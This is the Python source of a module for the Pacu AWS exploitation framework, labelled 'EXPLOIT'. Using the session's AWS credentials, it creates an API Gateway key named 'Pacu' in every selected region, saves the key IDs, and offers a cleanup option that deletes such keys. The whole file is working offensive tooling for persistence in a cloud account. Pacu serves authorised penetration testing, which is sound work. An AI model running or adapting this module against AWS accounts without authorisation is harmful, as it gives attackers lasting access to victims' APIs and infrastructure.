#!/usr/bin/env python3
import argparse
from copy import deepcopy
from botocore.exceptions import ClientError


module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'api_gateway__create_api_keys',

    # Name and any other notes about the author
    'author': 'Alexander Morgenstern alexander.morgenstern@rhinosecuritylabs.com',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'EXPLOIT',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Attempts to create an API Gateway key for any/all REST APIs that are defined.',

    # Full description about what the module does and how it works
    'description': 'This module automatically creates API keys for every available region. There is an included cleanup feature to remove old "Pacu" keys that are referenced by name.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['apigateway'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': [],

    # External resources that the module depends on. Valid options are either a GitHub URL (must end in .git) or single file URL.
    'external_dependencies': [],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--regions', '--cleanup'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
parser.add_argument('--regions', required=False, default=None, help='One or more (comma separated) AWS regions in the format us-east-1. Defaults to all session regions.')
parser.add_argument('--cleanup', required=False, default=None, action='store_true', help='Searches for Pacu keys previously generated and removes them.')


def cleanup(pacu_main, regions):
    print = pacu_main.print
    for region in regions:
        client = pacu_main.get_boto3_client('apigateway', region)
        try:
            keys = client.get_api_keys()['items']
            if len(keys) < 1:
                print('  No keys were found in {}'.format(region))
            for key in keys:
                if key['name'] == 'Pacu':
                    try:
                        client.delete_api_key(apiKey=key['id'])
                        print('  Key deletion successful for: {}'.format(region))
                    except ClientError as error:
                        if error.response['Error']['Code'] == 'AccessDeniedException':
                            print('    FAILURE: ')
                            print('      MISSING NEEDED PERMISSIONS')
                            return False
        except ClientError as error:
            if error.response['Error']['Code'] == 'AccessDeniedException':
                print('    FAILURE: ')
                print('      MISSING NEEDED PERMISSIONS')
                return False
    return True


def main(args, pacu_main):
    session = pacu_main.get_active_session()
    args = parser.parse_args(args)
    input = pacu_main.input
    print = pacu_main.print
    get_regions = pacu_main.get_regions
    regions = args.regions.split(',') if args.regions else get_regions('apigateway')

    summary_data = {'keys_created': 0}
    api_keys = {}
    if args.cleanup:
        if cleanup(pacu_main, regions):
            print('  Old Keys Cleaned')
            summary_data['cleanup'] = True
        else:
            print('  Failed to Cleanup Keys')
            summary_data['cleanup'] = False
        # Either way assume database has been cleared, it if failed it's out of sync
        session.update(pacu_main.database, APIGateway={})
        user_input = input('  Continue key creation? (y/n) ')
        if user_input.lower() != 'y':
            return summary_data

    for region in regions:
        api_keys[region] = []
        print('Starting region {}...'.format(region))
        client = pacu_main.get_boto3_client('apigateway', region)
        try:
            response = client.create_api_key(name='Pacu')
            api_keys[region].append(response['id'])
        except ClientError as error:
            if error.response['Error']['Code'] == 'AccessDeniedException':
                print('  FAILURE: ')
                print('    MISSING NEEDED PERMISSIONS')
                return summary_data
        print('  Key creation successful')
        summary_data['keys_created'] += 1

    api_gateway_data = deepcopy(session.APIGateway)
    for region in api_keys:
        if region in api_gateway_data:
            api_gateway_data[region].extend(api_keys[region])
        else:
            api_gateway_data[region] = api_keys[region]
    session.update(pacu_main.database, APIGateway=api_gateway_data)

    return summary_data


def summary(data, pacu_main):
    out = ''
    if data.get('cleanup'):
        out += '  Old keys removed.\n'
    out += '  {} key(s) created.\n'.format(data['keys_created'])
    if data['keys_created'] > 0:
        out += '  Keys saved in Pacu database.\n'
    return out
